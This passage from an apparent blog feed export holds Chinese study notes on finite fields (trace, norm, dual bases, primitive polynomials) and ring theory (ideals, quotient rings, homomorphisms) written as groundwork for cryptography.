f(x)\right)。\end{aligned}</script><hr><h2 id="构造不可约多项式"><a href="#构造不可约多项式" class="headerlink" title="构造不可约多项式"></a>构造不可约多项式</h2><h3 id="构造极小多项式"><a href="#构造极小多项式" class="headerlink" title="构造极小多项式"></a>构造极小多项式</h3><p>极小多项式本质上是一种不可约多项式，要构造不可约多项式，构造一个极小多项式即可。</p><p>$F_q:$基域<br>$F_{q^m}:$向量空间<br>$a\in F_{q^m}:$定义元素<br>$e,a,…,a^{m-1}:$基<br>设$b\in F_{q^m}$的极小多项式是$g(x)=d_0+d_1x+\cdots+d_mx^m\in F_q[X]$ ,则$g(b)=\theta$ </p><h3 id="构造本原多项式-primitive-polynomial"><a href="#构造本原多项式-primitive-polynomial" class="headerlink" title="构造本原多项式(primitive polynomial)"></a>构造本原多项式(primitive polynomial)</h3><p><strong>定义(本原多项式)</strong>:$f(x)\in F_q[X]$是非常数多项式，度为$m$,设$a\in F_q^m$是本原元，如果$f(x)$是$a$在$F_q$上的极小多项式，则$f(x)$称为$F_q$上的本原多项式。</p><p>$F_{q^m}$里非零元素个数$:q^{m-1}$ 本原元的阶：$q^m-1$</p><p>设 $q^m-1=h_1…h_k$,其中正整数$h_1,…,h_k$彼此互素，设非零元素 $a_i\in F_{q^m}^*$的阶为$h_i$,则<br>$c=a_1…a_k$的阶为$q^m-1$,</p><p>即 $c\in F_q^m$是本原元。</p><p><strong>定理</strong>：设 $g(x)$是$F_q$上度为$m$的不可约多项式，$c\in F_{q^m},g(c)=\theta$,则$g(x)$的根为$c,c^q,c^{q^2},\dots ,c^{q^{m-1}}$</p><hr><h2 id="迹-trace"><a href="#迹-trace" class="headerlink" title="迹(trace)"></a>迹(trace)</h2><p><strong>定义(迹)</strong>:<script type="math/tex">设 a\in F=F_{q^m}, K=F_q, a在K上的迹Tr_{F/K}(a)定义为\\Tr_{F/K}(a)=a+a^q+\cdots+a^{q^{m-1}}\\如果K是素子域,Tr_{F/K}(a)称为“绝对迹”(absolute trace),简记为Tr_F(a)</script></p><p><strong>迹的值域是子域K，算出来是K中的一个元素</strong></p><h3 id="特征多项式-characteristic-polynomial"><a href="#特征多项式-characteristic-polynomial" class="headerlink" title="特征多项式 (characteristic polynomial)"></a>特征多项式 (characteristic polynomial)</h3><p><strong>定义 (特征多项式)</strong>:设 $g(x)\in K[X]$是$a$在$K$上的极小多项式。$g(x)$的度为$d,d\mid m$,则 $g(x)^{m/d}\in K[X]$ 称作$a$在$K$上的特征多项式。</p><script type="math/tex; mode=display">\text{设 }g(x)^{m/d}=a_0+a_1x+\cdots+a_{m-1}x^{m-1}+x^m\text{。}g(x)\text{ 的根是}\\a,a^q,...,a^{q^{d-1}}\in F,\text{ 则 }g(x)^{m/d}\text{的根是 }a,a^q,...,a^{q^{m-1}}\in F,\text{ 有}\\g(x)^{m/d}=(x-a)(x-a^q)...(x-a^{q^{m-1}})。\\\text{整理 }g(x)^{m/d}\text{ 的两个表达式可知,}Tr_{F/K}(a)=-a_{m-1}\text{。}</script><p><strong>定义(迹的传递性)</strong>：设 $F$是$K$的扩域，$K$是$L$的扩域，对于所有的$a\in F$,有<br>$Tr_{F/L}(a)=Tr_{K/L}(Tr_{F/K}(a))$</p><p><strong>迹的性质</strong>：</p><p>迹的性质：设$F=F_q^m,K=F_q$,迹函数$Tr_{F/K}$满足以下性质：<br>$(1)Tr_{F/K}(a+b)=Tr_{F/K}(a)+Tr_{F/K}(b)$,对于所有$a,b\in F$<br>$(2)Tr_{F/K}(c\cdot a)=c\cdot Tr_{F/K}(a)$,对于所有$c\in K,a\in F$<br>$(3)Tr_{F/K}$是从$F$到K的线性变换，其中$F$和$K$都看作是$K$的向量空间<br>$(4)Tr_{F/K}(c)=mc$,对于所有$c\in K$<br>$(5)Tr_{F/K}(a^q)=Tr_{F/K}(a)$,对于所有$a\in F$</p><h3 id="迹的应用"><a href="#迹的应用" class="headerlink" title="迹的应用"></a>迹的应用</h3><p>$K=F_q:$基域<br>$F=F_{q^m}$:向量空间<br>$a_1,…,a_m:$基($对偶基：b_1,…,b_m$）<br>设$c\in F$,有$c=c_1a_1+\cdots+c_ma_m$<br>$= Tr_{F/ K}( b_1c) a_1+ \cdots + Tr_{F/ K}( b_mc) a_m$ ,<br>$b_1,…,b_m\in F$<br>关系式：$c_j=Tr_{F/K}(b_jc)$</p><script type="math/tex; mode=display">i\neq j:Tr_{F/K}(b_j a_i)=\theta\\i=j:Tr_{F/K}(b_j a_i)=e</script><h4 id="对偶基-dual-basis"><a href="#对偶基-dual-basis" class="headerlink" title="对偶基(dual basis)"></a>对偶基(dual basis)</h4><p><strong>定义 (对偶基)</strong>:设$F$和$K$是有限域，$F$是K的扩域，${a_1,…,a_m}$和${b_1,…,b_m}$<br>是$K$上$F$的两组基。如果对于$1\leq i,j\leq m$,有</p><script type="math/tex; mode=display">i\neq j:Tr_{F/K}(b_j\:a_i)=\theta\\i=j:Tr_{F/K}(b_j\:a_i)=e</script><p>则 ${a_1,…,a_m}$和${b_1,…,b_m}$称为对偶基，也称互补基 (complementary basis)。<br>${a_1,…,a_m}={b_1,…,b_m}$时，${a_1,…,a_m}$叫自对偶基(self-dual basis)。</p><p>每个基的对偶基：都<strong>存在</strong>且<strong>唯一</strong></p><hr><h2 id="范-norm"><a href="#范-norm" class="headerlink" title="范(norm)"></a>范(norm)</h2><p><strong>定义 (范)</strong>: 设 $a\in F= F_q^m, K= F_q$, $a$在$K$上的范$N_F/K(a)$定义为<br>$N_{F/K}(a)=a\cdot a^q\cdot\cdots\cdot a^{q^{m-1}}=a^{\frac{q^m-1}{q-1}}$</p><p>设 $g(x)\in K[X]$是$a$在$K$上的极小多项式。$g(x)$的度为$d,d\mid m$,则<br>$g(x)^{m/d}\in K[X]$ 称作$a$在$K$上的特征多项式。<br>设$g(x)^{m/d}=a_0+a_1x+\cdots+a_{m-1}x^{m-1}+x^m$。$g(x)$的根是<br>$a,a^q,…,a^{q^{d-1}}\in F$,则 $g(x)^{m/d}$的根是 $a,a^q,…,a^{q^{m-1}}\in F$,有<br>$g(x)^{m/d}=(x-a)(x-a^q)…(x-a^{q^{m-1}})$。<br>整理$g(x)^{m/d}$的两个表达式可知，$N_{F/K}(a)=(-1)^ma_0$。</p><p><strong>定义 (范的传递性)</strong>:设 $F$是$K$的扩域，$K$是$L$的扩域，对于所有的$a\in\mathcal{F}$,有$N_{F/L}(a)=N_{K/L}(N_{F/K}(a))$</p><script type="math/tex; mode=display">\begin{aligned}&\text{范的性质:设 }F=F_{q^m}, K=F_q, \text{范函数 }N_{F/K} \text{满足以下性质}:\\&(1) N_{F/K}(a\cdot b)=N_{F/K}(a)\cdot N_{F/K}(b)\text{,对于所有}a,b\in F\\&(2) N_{F/K}\text{将}F\text{映射到}K\text{,将}F^*\text{映射到}K^*\\&(3) N_{F/K}(c)=c^m, \text{对于所有}c\in K\\&(4) N_{F/K}(a^q)=N_{F/K}(a), \text{对于所有}a\in F\end{aligned}</script><h2 id="代数闭包-algebraic-closure"><a href="#代数闭包-algebraic-closure" class="headerlink" title="代数闭包(algebraic closure)"></a>代数闭包(algebraic closure)</h2><script type="math/tex; mode=display">\begin{aligned}&\text{设}K\text{是域,}K\text{的代数闭包}\overline{K}\text{是包含}K\text{和}K[X]\text{里所有多项式的根的最}\text{小扩域。}\\&\overline{K}=K(a_1,a_2,a_3,...)\\&\text{其中,}a_1,a_2,a_3,...\text{是}K[X]\text{里所有多项式的根。}\end{aligned}</script><p>$\overline{K}$包含$K$的所有代数元素   </p><p>例：复数域C是实数域R的代数闭包</p><hr><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><p>太痛苦了，我从来没有觉得学习抽象代数开心过。</p><p>★,°<em>:.☆(￣▽￣)/$:</em>.°★<em> 。<em>*爱来自😽C.A.T😸喵</em></em></p>]]></content>
      
      
      <categories>
          
          <category> Crypto数学基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 筑基篇 </tag>
            
            <tag> 有限域 </tag>
            
            <tag> 抽象代数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>筑基篇·抽象代数·环论</title>
      <link href="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/"/>
      <url>/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="密码学学习笔记——筑基篇·卷三（环论）"><a href="#密码学学习笔记——筑基篇·卷三（环论）" class="headerlink" title="密码学学习笔记——筑基篇·卷三（环论）"></a>密码学学习笔记——筑基篇·卷三（环论）</h2><hr><h1 id="环论"><a href="#环论" class="headerlink" title="环论"></a>环论</h1><p><em>ring啊ring啊ring，爱的和弦铃，yeah！</em></p><hr><h2 id="环-ring"><a href="#环-ring" class="headerlink" title="环(ring)"></a>环(ring)</h2><script type="math/tex; mode=display">(R,+,\cdot)\\\ R指非空集合，+指加法，\cdot指乘法(加法乘法是抽象概念，不是算数加法和乘法)</script><ul><li><p><strong>加法阿贝尔群</strong>：($R,+)$是阿贝尔群</p></li><li><p><strong>乘法半群</strong>：$(R,\cdot)是半群，满足封闭性、结合律$</p></li><li><p><strong>分配律</strong>：$\forall a, b, c\in R$, $a\cdot ( b+ c) = a\cdot b+ a\cdot c$</p><p>$(b+c)\cdot a=b\cdot a+c \cdot a$</p></li></ul><p><strong>环可以表示形如</strong><script type="math/tex">a_0+a_1\cdot x+\cdots+a_n\cdot x^n\\\text{其中 }a_0,a_1,...a_n\in(R,+,\cdot)</script>的<strong>多项式</strong></p><p><strong>有限环</strong>:环的元素数量是有限的</p><p><strong>无限环</strong>:环的元素数量是无限的</p><blockquote><p><strong>例1</strong>：$整数环(\mathbb{Z},+,\times):$</p><ul><li>$(\mathbb{Z},+)是阿贝尔群$</li><li>$(\mathbb{Z},\times)满足封闭性、结合律$</li><li>$\times 对+满足分配律$</li></ul><p><strong>例2</strong>：$\text{有理数环 }(\mathbb{Q},+,\times)\text{、实数环 }(\mathbb{R},+,\times)$</p><p><strong>例3</strong>：$(\mathbb{Z}_n,+,\times)$ 是个环，$n$是正整数</p><ul><li>$(\mathbb{Z}_n,+)$是阿贝尔群</li><li>$(\mathbb{Z}_n,\times)$满足封闭性、结合律</li><li>$\times$对$+$满足分配律 (模运算下)</li></ul></blockquote><h3 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h3><p>简称$R$为环，$\forall a,b\in R$,有</p><p>$\theta:$加法单位元，称<strong>零元(zero element)</strong></p><p>$-a:a$的加法逆元</p><p>$a- b:$ $a+ ( - b)$</p><p>$e:$乘法单位元，称<strong>单位元</strong></p><p>$a^{-1}:a$的乘法逆元</p><p>$ab:$ $a\cdot b$</p><p>$\frac ab:$ $a\cdot {b}^{- 1}$</p><h4 id="含幺交换环-commutative-ring-with-identity"><a href="#含幺交换环-commutative-ring-with-identity" class="headerlink" title="含幺交换环(commutative ring with identity)"></a>含幺交换环(commutative ring with identity)</h4><p>即使<strong>含幺环</strong>又是<strong>交换环</strong>，即有<strong>乘法单位元</strong>的同时运算满足<strong>乘法交换律</strong></p><blockquote><p>例:$整数环(\mathbb{Z},+,\times):$</p><ul><li>$(\mathbb{Z},+)是阿贝尔群$</li><li>$半群(\mathbb{Z},\times)：单位元1、乘法交换律$</li><li>$\times 对+满足分配律$</li></ul><p>$\mathbb{Z}是无限含幺交换环$</p><p>$\mathbb{Z}_n是有限含幺交换环$</p></blockquote><ul><li>含幺环(ring with identity)：有乘法<strong>单位元</strong>，乘法部分变为<strong>幺半群</strong></li><li>交换环(commutative ring)：满足<strong>乘法交换律</strong></li></ul><hr><h2 id="零元-zero-element"><a href="#零元-zero-element" class="headerlink" title="零元(zero element)"></a>零元(zero element)</h2><p><strong>定义</strong>：<script type="math/tex">*</script>是定义在非空集合$A$上的二元运算，$\theta\in A$ ,<br>如果$\forall a\in A$,都有<script type="math/tex">\theta*a=a*\theta=\theta,</script><br>则称θ为<strong>零元</strong>。</p><p><strong>封闭性</strong>：左右零元相等且唯一</p><p><strong>定理1</strong>：<script type="math/tex">(A,*)</script>是代数结构，$|A|&gt;1$,如果$A$中存在零元$\theta$和单位元$e$,则 $\theta\neq e$ 。</p><p><strong>定理2</strong>：群中无零元</p><p><strong>定理3</strong>：$R$是环，$\forall a\in R,\ \theta\cdot a=a\cdot \theta=\theta$</p><h3 id="零因子-zero-divisor"><a href="#零因子-zero-divisor" class="headerlink" title="零因子(zero divisor)"></a>零因子(zero divisor)</h3><p><strong>定义</strong>：环$R$ 中，非零元素 $a,b\in R\left(a\neq\theta,b\neq\theta\right.$)</p><p>有<script type="math/tex">ab=\theta,</script><br>则称$a$ 和$b$ 为零因子。</p><blockquote><p>例：环$\mathbb{Z}_6:2,3\in\mathbb{Z}_6,(2\times3)$ mod 6=0</p></blockquote><p>环$R$ 中：</p><ul><li>有零因子：$\exists a,b\in R\left(a\neq\theta,b\neq\theta\right)$有$ab=\theta$ </li><li>无零因子：$\forall a,b\in R\left(a\neq\theta,b\neq\theta\right)$,有$ab\neq\theta$</li></ul><h3 id="整环-intergral-domain"><a href="#整环-intergral-domain" class="headerlink" title="整环(intergral domain)"></a>整环(intergral domain)</h3><p><strong>含幺交换环</strong>，$\theta\neq e$ ，<strong>且无零因子</strong>，称作<strong>整环</strong>(或一个<strong>非平凡</strong>的含幺交换环，没有零因子)</p><blockquote><p>$\mathbb{Z}是整环:含幺交换环,无零因子,(非零整数相乘不可能等于0)$</p><p>$\mathbb{R}$、$\mathbb{Q}$也是整环</p><p>正整数$n&gt;1$：$n$是素数$\Leftrightarrow Z_n$ 是整环,$n$是合数$\Leftrightarrow Z_n$ 不是整环,</p></blockquote><h3 id="平凡环-trival-ring"><a href="#平凡环-trival-ring" class="headerlink" title="平凡环(trival ring)"></a>平凡环(trival ring)</h3><p>$R={\theta}$</p><p>$环R有(乘法)单位元e:$$e=0\Rightarrow 平凡环$</p><h3 id="非平凡环-non-trival-ring"><a href="#非平凡环-non-trival-ring" class="headerlink" title="非平凡环(non-trival ring)"></a>非平凡环(non-trival ring)</h3><p>$R\not={\theta}$</p><p>$环R有(乘法)单位元e:$$e\not=0\Rightarrow 非平凡环$</p><hr><h2 id="域-field"><a href="#域-field" class="headerlink" title="域(field)"></a>域(field)</h2><h3 id="除环-division-ring"><a href="#除环-division-ring" class="headerlink" title="除环(division ring)"></a>除环(division ring)</h3><p>$(R\backslash{\theta},\cdot)是群$,不考虑环的零元，乘法可以不满足交换律</p><h3 id="域的定义"><a href="#域的定义" class="headerlink" title="域的定义"></a>域的定义</h3><p><strong>除环</strong>的乘法满足<strong>乘法交换律</strong>$\Rightarrow$<strong>非零元素与乘法构成阿贝尔群</strong>，$(R\backslash{\theta},\cdot)是$<strong>阿贝尔群</strong></p><p>$(F,+,\cdot)是一个域,则它满足以下条件:$</p><ul><li>$加法阿贝尔群:(F,+)是阿贝尔群$</li><li>$乘法阿贝尔群:(F\backslash{\theta},\cdot)是阿贝尔群$</li><li>$分配律:\forall a,b,c\in F,a\cdot(b+c)=a\cdot b+a\cdot c$</li></ul><p><strong>定理1</strong>：<strong>域</strong>一定是<strong>整环</strong>，<strong>域</strong>里没有<strong>零因子</strong></p><p><strong>无限整环不一定是域</strong>：</p><ul><li>$\mathbb{Q}、\mathbb{R}$是域</li><li>$\mathbb{Z}$不是域：$(\mathbb{Z}\backslash{0},\times)$不是阿贝尔群 (不是所有元素都有逆元)</li></ul><p><strong>定理2</strong>：<strong>有限整环</strong>一定是(有限)<strong>域</strong></p><p><strong>性质</strong>：</p><ul><li>非平凡：包含至少2个元素($\theta和 e，e\neq 0$)</li><li>没有零因子</li></ul><h2 id="特征-characteristic"><a href="#特征-characteristic" class="headerlink" title="特征(characteristic)"></a>特征(characteristic)</h2><p><strong>定义</strong>：$R$是环，如果存在<strong>最小正整数</strong>$m$,对于$\forall a\in R$ ,<br>使得 $ma=\theta$,则称 $m$ 是环$R$的<strong>特征</strong>。如果这样的$m$不存在，则称 $R$ 的特征是<strong>0</strong>。记为$Char\ R$。</p><h3 id="加法阶"><a href="#加法阶" class="headerlink" title="加法阶"></a>加法阶</h3><p>$R$是环，$a\in R$,如果存在最小正整数$k$,使得$ka=\theta$ ($\theta$是环$R$加法阿贝尔群的单位元),则称$k$为$a$的<strong>加法阶</strong>。</p><p>如果这样的$k$<strong>不存在</strong>，则称$a$是<strong>无限加法阶</strong>的元素。</p><p><strong>定理1</strong>：如果<strong>环</strong>的特征不等于0，环里元素的<strong>加法阶</strong>就都是<strong>有限</strong>的，而且都是<strong>特征的因子</strong>。</p><p><strong>定理2</strong>：<strong>含幺交互环</strong>的<strong>特征</strong>等于<strong>0或其单位元的加法阶</strong></p><blockquote><p>例：$Char\ \mathbb{Z}=0$，$Char\ \mathbb{Z}_n=n$</p></blockquote><p><strong>定理3</strong>：<strong>整环</strong>的<strong>特征</strong>等于<strong>0或素数</strong>，<strong>整环</strong>中，<strong>单位元</strong>的<strong>加法阶</strong>要么是<strong>无限</strong>的，要么是<strong>素数</strong>。</p><p><strong>定理4</strong>：<strong>域</strong>的<strong>特征</strong>等于<strong>0或素数</strong>；<strong>有限域</strong>的<strong>特征</strong>是<strong>素数</strong></p><hr><h2 id="子环-subring"><a href="#子环-subring" class="headerlink" title="子环(subring)"></a>子环(subring)</h2><p><strong>定义</strong>：$(R,+,\cdot)$是环，$S$ 是 $R$ 的非空子集，如果$(S,+,\cdot)$ 也是环，称$(S,+,\cdot)$是$(R,+,\cdot)$的子环。简称$S$ 是$R$ 的子环，$R$ 是$S$ 的<strong>扩环(extension ring)</strong>。</p><blockquote><p>例：</p><ul><li>$Q是R的子环,R是Q的扩环。$</li><li>$Z是Q和R的子环,Q和R是Z的扩环$。</li><li>$Z_n不是Z的子环:二者元素和运算不同(Z_n中的元素是剩余类而非整数)$</li><li>$mZ是Z的子环(m是整数)$</li></ul></blockquote><p>定义判断<strong>子环</strong>：非空子集$S\subseteq R$ ($\forall a,b\in S)$</p><ul><li><p><strong>加法阿贝尔群</strong></p><p>封闭性：$a+b\in S$</p><p><del>结合律：$a+(b+c)=(a+b)+c$</del></p><p><del>单位元：$\theta\in S$</del></p><p><del>逆元：$-a\in S$</del></p></li><li><p><strong>乘法半群</strong></p><p>封闭性：$ab\in S$</p><p><del>结合律：$a(bc)=(ab)c$</del></p></li></ul><p><strong>命题1</strong>：$(R,+,\cdot)$是环，$S $是$R$的<strong>非空子集</strong>，$S$是$R$的子环，当且仅当，$\forall a,b\in S$,$S$满足以下条件：</p><ul><li><strong>加法封闭性</strong>：$a-b\in S$或满足<strong>加法子群</strong>：$(R,+)$的子群</li><li><strong>乘法封闭性</strong>：$ab\in S$</li></ul><p><strong>注意</strong>：</p><p><strong>含幺交换环的子环未必是含幺交换环</strong></p><blockquote><p>例：Z是含幺交换环，它的子环里，只有它本身是含幺交换环，其他的都不是含幺交换环。</p></blockquote><p><strong>整环的子环未必是整环</strong></p><p><strong>域的子环未必是域</strong></p><h3 id="理想-ideal"><a href="#理想-ideal" class="headerlink" title="理想(ideal)"></a>理想(ideal)</h3><p><strong>全称</strong>：理想子环</p><p><strong>定义</strong>：$(R,+,\cdot)$是环，$I$ 是 $R$的非空子集。如果$(I,+,\cdot) $满足以下条件：</p><ul><li>加法子群：($I$,+)是$(R,+)$的子群，</li><li>(乘法)<strong>吸收</strong>律：$\forall r\in R,\forall a\in I\Rightarrow ra\in I$ $(ar\in I)$,</li></ul><p>则称$I$是$R$的<strong>左(右)理想</strong>。</p><p><strong>命题</strong>：$(R,+,\cdot)$是交换环，$I $是$R$的理想，$\forall a,b\in I $,$\forall r\in R$,当且仅当，$I$满足以下条件：</p><ul><li>加法封闭性：$a+b\in I$</li><li>(乘法)吸收律：$ra\in I$</li></ul><p><strong>定理</strong>1：任何理想都是子环</p><p><strong>注意</strong>：理想/子环一定包含环的零元，但未必包含环的单位元</p><p><strong>定理</strong>2：$R$是环，$I$是$R$的理想，$e\in R$,则<script type="math/tex">e\in I\Leftrightarrow I=R</script></p><p><strong>注意</strong>：环、子环的单位元并无关系</p><h4 id="一些概念-1"><a href="#一些概念-1" class="headerlink" title="一些概念"></a>一些概念</h4><p>设$R$是环，$I$是$R$的理想：</p><ul><li><strong>零理想</strong>(zero ideal): ${\theta}$ (其他的称为<strong>非零理想</strong>)</li><li><strong>单位理想</strong>(unit ideal): $R$自身</li><li><strong>平凡理想</strong>(trivial ideal): ${\theta}$和$R$，(其他的称为<strong>非平凡理想</strong>)</li><li><strong>真理想</strong>(proper ideal): $I\subset R$</li></ul><h4 id="主理想-principal"><a href="#主理想-principal" class="headerlink" title="主理想(principal)"></a>主理想(principal)</h4><p><strong>定义</strong>：$R$是环，$a\in R$,称$aR (Ra)$为由$a$生成的$R$的左(右)主理想</p><script type="math/tex; mode=display">(aR=\{ar\mid r\in R\},\quad Ra=\{ra|r\in R\})</script><ul><li>$R$是<strong>交换环</strong>，$a\in R$,则$aR=Ra$，称之为由于$a$生成的$R$的主理想，记为$(a)$</li><li>${\theta}=(\theta)$</li><li>$R=eR=Re=(e)\ (含幺交换环)$</li></ul><p><strong>定理1</strong>：$R$是交换环，$a\in R,(a)$是$R$的理想</p><p><strong>性质</strong>：环的理想包含元素a，一定包含由a生成的主理想</p><blockquote><p>例：$mZ$是$Z$的主理想(m是整数)</p><ul><li>$m\in Z,mZ符合主理想的构造方法$</li></ul></blockquote><p>$Z$的所有理想都是主理想：$(m):=mZ(m是整数)$</p><h4 id="素理想-prime-ideal"><a href="#素理想-prime-ideal" class="headerlink" title="素理想(prime ideal)"></a>素理想(prime ideal)</h4><p><strong>定义</strong>：$I$ 是环$R$ 的真理想。$\forall\boldsymbol{a},\boldsymbol{b}\in R$,如果$ab\in I$,有$a\in I$ 或 $b\in I$ ,称$I$是$R$的素理想</p><p>$p|ab$,则$p|a$或$p|b$</p><blockquote><p>例1：<strong>$m$是素数时，$mZ$是素理想</strong>：$a,b\in Z,ab\in3Z$<br>则 3$|ab$,有3$|a$或3$|b$,即$a\in3Z$或$b\in3Z$</p><p>例2：零理想${0}=0\mathbb{Z}$ 是$Z$的素理想：$\boldsymbol a,b\in Z$ , $ab=0\in{0}$,则$a=0\in{0}$ 或 $b=0\in{0}$</p><p>例3：$m$是合数时，$mZ$不是素理想：$a=2$和$b=3$,$ab\in6Z$,但$a\in2Z,b\in3Z$</p><p>结论：<strong>当且仅当，$m$是素数或0时，$mZ$</strong>是$Z$的素理想</p></blockquote><p><strong>注意</strong>：讨论素理想时，不考虑单位理想，因为它不是真理想</p><h4 id="极大理想-maximal-ideal"><a href="#极大理想-maximal-ideal" class="headerlink" title="极大理想(maximal ideal)"></a>极大理想(maximal ideal)</h4><p><strong>定义</strong>：$M$ 是环R 的<strong>真理想</strong>。除$R$以外，<strong>不存在</strong>任何包含$M$的理想，则称$M$ 是$R$ 的<strong>极大理想</strong></p><p><strong>等价定义</strong>：$M$ 是环R 的<strong>真理想</strong>。对于任意包含$M$的理想$I$,都有$I=M$或$I=R$ ,则称$M$是$R$的<strong>极大理想</strong></p><blockquote><p>例：<strong>$m$是素数时，$mZ$是$Z$的极大理想</strong></p><p>例：零理想{0}不是$Z$的极大理想，因为$Z$的任何(非平凡)理想都包含{0}</p></blockquote><h4 id="小结：-mathbb-Z-的3种理想"><a href="#小结：-mathbb-Z-的3种理想" class="headerlink" title="小结：$\mathbb{Z}$的3种理想"></a>小结：$\mathbb{Z}$的3种理想</h4><p>设$m$是任意整数 $((m):=m\mathbb{Z})$</p><ul><li>$(m):$主理想</li><li>$(m)$:素理想、极大理想($m$为素数)</li><li>$(0):={0}=0\mathbb{Z}$:主理想和素理想(不是极大理想)</li><li>$(1):=\mathbb{Z}$:主理想(不是素理想、极大理想)</li></ul><hr><h2 id="子域-subfield"><a href="#子域-subfield" class="headerlink" title="子域(subfield)"></a>子域(subfield)</h2><p><strong>定义</strong>：$F$是域，$F^\prime$ 是$F$ 的<strong>子环</strong>。如果$F^\prime$也是域，称$F^{\prime}$是$F$的<strong>子域</strong>，$F$ 是 $F^\prime$ 的<strong>扩域 (extension field)</strong>。</p><h3 id="域的理想"><a href="#域的理想" class="headerlink" title="域的理想"></a>域的理想</h3><p><strong>定理</strong>：域没有非平凡理想(只有零理想和单位理想)</p><p><strong>推论</strong>：零理想是域的极大理想</p><p><strong>定理</strong>：零理想是含幺交换环的极大理想，当且仅当，这个环是域</p><hr><h2 id="商环-quotient-ring"><a href="#商环-quotient-ring" class="headerlink" title="商环(quotient ring)"></a>商环(quotient ring)</h2><p>$R$是环，$I$是$R$的理想</p><script type="math/tex; mode=display">(I,+)\xrightarrow{\text{正规子群}}(R,+)</script><script type="math/tex; mode=display">(R/I,+):=\{[a]_I\mid a\in R\}</script><script type="math/tex; mode=display">[a]_I=a+I:=\{\begin{array}{c}a+t|t\in I\}\end{array}</script><script type="math/tex; mode=display">[a]_I\cdot[b]_I:=[ab]_I</script><p>只有单位理想构造的商环是平凡的</p><p>商环 ($R/I,+,\cdot)$</p><p>又称 $R$模$I$的<strong>剩余类环</strong></p><p><strong>加法</strong>：$[a]_I+[b]_I:=[a+b]_I$</p><p><strong>乘法</strong>：$[a]_I\cdot[b]_I:=[ab]_I$</p><p><strong>零元</strong>：$[\theta]_I={\theta+t|t\in I}={t\in I}=I$</p><p><strong>单位元</strong>：$[e]_I={e+t|t\in I}$</p><blockquote><p>例：商环$Z_n$$(n$是正整数)        </p><p>$Z$是环                $nZ$是双边理想</p><p>$(nZ,+)$是$(Z,+)$的正规子群</p><p>$(Z_n,+):=(Z/nZ,+)$是商群</p><p>$(Z_n,+,\cdot):=(Z/nZ,+\cdot)$是商环</p></blockquote><h3 id="双边理想-two-sided-ideal"><a href="#双边理想-two-sided-ideal" class="headerlink" title="双边理想(two-sided ideal)"></a>双边理想(two-sided ideal)</h3><p>定义：$(R,+,\cdot)$是环，$I $是$ R$ 的非空子集。如果$(I,+,\cdot)$ 满足以下条件：</p><p>加法子群$:(I,+)$是$(R,+)$的子群，<br>(乘法)吸收律：$\forall r\in R,\forall a\in I\Rightarrow ra,ar\in I$,</p><p>则称$I$是$R$ 的双边理想。</p><p><strong>单边理想(one-sided ideal)</strong>:左理想、右理想<br><strong>交换环</strong>的理想都是<strong>双边理想</strong><br><strong>单位理想</strong>$R$<strong>是双边理想</strong></p><h3 id="商环的理想"><a href="#商环的理想" class="headerlink" title="商环的理想"></a>商环的理想</h3><p>理想是一种子环$\Rightarrow$ 商环的理想是商环的子环</p><p>$R$是环，$I$是$R$的双边理想，$R/I$是相应的商环<br>$K/I={[a_1]_I,[a_2]_I,…},a_1,a_2\in K$,    $K$是$R$的双边理想，$I$ 是$K$ 的双边理想。</p><h3 id="something-special"><a href="#something-special" class="headerlink" title="something special"></a>something special</h3><p>$R:$<strong>含幺交换环</strong></p><ul><li>定理1：$I$ 是<strong>素理想</strong>$\Leftrightarrow R/I$ 是<strong>整环</strong></li><li>定理2：$I$ 是<strong>极大理想</strong>$\Leftrightarrow R/I$ 是<strong>域</strong>(域是整环)</li><li>定理3：$M$是极大理想$\Longrightarrow M$是素理想</li><li>商环$R/I:$零元$[\theta]_I=I$,单位元$[e]_I=e+I$$(R/I$是非平凡的含幺交换环)</li></ul><hr><h2 id="环同态"><a href="#环同态" class="headerlink" title="环同态"></a>环同态</h2><p><strong>定义</strong>：$(R,+,\cdot)和(R^{\prime},\oplus,\odot)是环，\forall a,b\in R,函数$</p><p>$f{:}R \to R^{\prime}$满足以下条件：</p><script type="math/tex; mode=display">f(a+b)=f(a)\oplus f(b)$$    $((R,+)\text{到}(R^{\prime},\oplus)\text{的加法群同态})$$$f(a\cdot b)=f(a)\odot f(b)</script><p>则称$f$为$R$到$R^\prime$的环同态</p><p>$同态核\operatorname{Ker}f:={a\in R|f(a)=\theta^{\prime}(R’的零元)}$</p><p>$\text{扩展:}S:=R\Longrightarrow f(R)=Imf，Im f\text{是}R^{\prime}\text{的子环}$</p><p>$扩展：S^\prime:={\theta^{\prime}}\Rightarrow f^{-1}(S^{\prime})=f^{-1}({\theta^{\prime}})=Kerf,同态核Ker f是R的子环$</p><p>$扩展：I^\prime:={\theta^{\prime}}\Longrightarrow f^{-1}(I^{\prime})=f^{-1}({\theta^{\prime}})=Kerf,同态核Kerf是R的理想$</p><p>同态核是双边理想</p><hr><p>设$f{:}R\to R^{\prime}$是环同态：</p><p><strong>定理1</strong>：环同态是单射$\Leftrightarrow Kerf={\boldsymbol{\theta}}$<br><strong>定理2</strong>：环同态是满射$\Leftrightarrow I\boldsymbol{m}f=R^\prime$</p><hr><p>设$f:R\to R^{\prime}$是环同态，$\forall a\in R:$<br><strong>性质1</strong>：$f(ka)=k f(a),k\in \mathbb{Z}$<br><strong>性质2</strong>：$f(a^k)=f(a)^k,k\in\mathbb{N}$</p><hr><p>$f是满同态,R是含幺环:$</p><p>性质3$:f(a^k)=f(a)^k,\quad k\in Z,\quad a\text{有乘法逆元}$<br>性质4$:f(e)=e^{\prime},\quad e^{\prime}\text{是}R^{\prime}的单位元$</p><hr><p>环的理想对应同态像的理想，同态像的理想反穿越后一定是定义域的理想。</p><h3 id="环同态的复合"><a href="#环同态的复合" class="headerlink" title="环同态的复合"></a>环同态的复合</h3><p><strong>定理</strong>：$f$是$R$到$R^\prime$的环同态，$f^\prime$是$R^{\prime}$到$R’’$的环同态，则$f$和$f^\prime$的复合<script 